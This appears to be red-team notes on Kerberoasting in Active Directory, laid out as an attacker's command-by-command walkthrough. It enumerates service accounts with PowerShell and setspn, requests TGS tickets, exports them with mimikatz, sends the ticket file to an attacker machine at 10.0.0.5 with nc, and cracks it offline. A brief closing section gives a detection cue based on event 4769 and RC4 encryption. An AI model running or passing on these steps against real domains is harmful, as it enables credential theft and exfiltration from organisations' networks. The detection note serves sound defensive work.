### Attack that allows any domain user to request kerberos tickets from TGS that are encrypted with NTLM hash of the plaintext password of a domain user account that is used as a service account (i.e account used for running an IIS service) and crack them offline avoiding AD account lockouts.


#### Execution ::

 a user account with servicePrincipalName attribute set, which is very important piece for kerberoasting 
 
 Attacker setting up an nc listener to receive a hash for cracking:
 nc -lvp 443 > kerberoast.bin
 
 
#### Extracting the Ticket ::
 
 Attacker enumerating user accounts with serverPrincipalName attribute set:
 Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
 
 Using only built-in powershell, we can extract the susceptible accounts with:
 get-adobject | Where-Object {$_.serviceprincipalname -ne $null -and $_.distinguishedname -like "*CN=Users*" -and $_.cn -ne "krbtgt"}
 or 
 get-adobject -filter {serviceprincipalname -like “*sql*”} -prop serviceprincipalname
 
 
 Additionally, user accounts with SPN set could be extracted with a native windows binary:
  setspn -T offense -Q */*
  
  
Attacker requesting a kerberos ticket (TGS) for a user account with servicePrincipalName set to HTTP/dc-mantvydas.offense.local- it gets stored in the memory:
Add-Type -AssemblyName System.IdentityModel  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/dc-mantvydas.offense.local"


Using mimikatz, the attacker extracts kerberos ticket from the memory and exports it to a file for cracking:
mimikatz # kerberos::list /export


Attacker sends the exported service ticket to attacking machine for offline cracking:
nc 10.0.0.5 443 < C:\tools\mimikatz\x64\2-40a10000-spotless@HTTP~dc-mantvydas.offense.local-OFFENSE.LOCAL.kirbi



#### Cracking the Ticket ::

Attacker brute forces the password of the service ticket:
python2 tgsrepcrack.py pwd kerberoast.bin


#### Observations :::

If you see Add-event -AssemblyName SystemIdentityModel (from advanced Powershell logging) followed by a windows security event 4769 immediately after that, you may be looking at an old school Kerberoasting, especially if ticket encryption type has a value 0x17 (23 decimal, meaning it's RC4 encrypted):

Note how the ticket's previously encrypted piece is now in plain text and we can see information pertinent to the requested ticket for a service
